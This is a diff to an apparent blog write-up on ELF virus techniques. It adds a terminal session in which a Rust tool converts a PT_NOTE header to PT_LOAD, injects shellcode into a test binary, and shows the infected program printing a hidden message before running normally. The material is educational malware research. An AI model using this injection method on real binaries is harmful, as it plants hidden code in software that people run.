@@ -116,6 +116,27 @@ mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
 
 After being infected, an ELF file's entry point will point to the virtual memory offset the shellcode is loaded to, as defined by our crafted `PT_LOAD` program header. Because the shellcode was patched with a jump instruction back to the original entry point, the program will run normally after the shellcode has run.
 
+```
+$ make
+cd files && make && cd ..
+make[1]: Entering directory '/.../files'
+rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
+nasm -o shellcode.o shellcode.s
+make[1]: Leaving directory '/.../files'
+cargo run --release files/target files/shellcode.o
+   Compiling mental_elf v0.1.0 (https://github.com/d3npa/mental-elf#0355d2d3)
+   Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
+    Finished release [optimized] target(s) in 1.15s
+     Running `target/release/ptnote-to-ptload-elf-injection files/target files/shellcode.o`
+Found PT_NOTE section; converting to PT_LOAD
+echo 'Done! Run target with: `./files/target`'
+Done! Run target with: `./files/target`
+$ ./files/target
+dont tell anyone im here
+hello world!
+$
+```
+
 ## Conclusion
 
 This was a very fun project where I learned so much about ELF, parsing binary structures in Rust, and viruses in general. Thanks to netspooky, sblip, and others at tmp.out for teaching me, helping me debug and motivating me to do this project! <3
